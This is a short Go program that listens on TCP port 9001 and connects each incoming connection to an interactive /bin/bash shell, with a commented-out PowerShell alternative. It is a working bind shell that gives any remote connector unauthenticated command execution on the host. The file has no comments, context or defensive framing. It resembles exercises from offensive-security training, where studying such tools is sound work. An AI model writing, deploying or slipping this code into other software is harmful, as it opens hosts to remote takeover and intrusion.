package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func echo(conn net.Conn) {
	defer conn.Close()

	if _, err := io.Copy(conn, conn); err != nil {
		log.Fatalln("Unable to read/write data.")
	}
}

func handle(conn net.Conn) {
	//cmd := exec.Command("powershell.exe")
	cmd := exec.Command("/bin/bash", "-i")
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp

	go io.Copy(conn, rp)
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}

	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":9001")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}
	log.Println("Listening on 0.0.0.0:9001")

	for {
		conn, err := listener.Accept()
		log.Println("Received connection")
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}

		go handle(conn)
	}
}
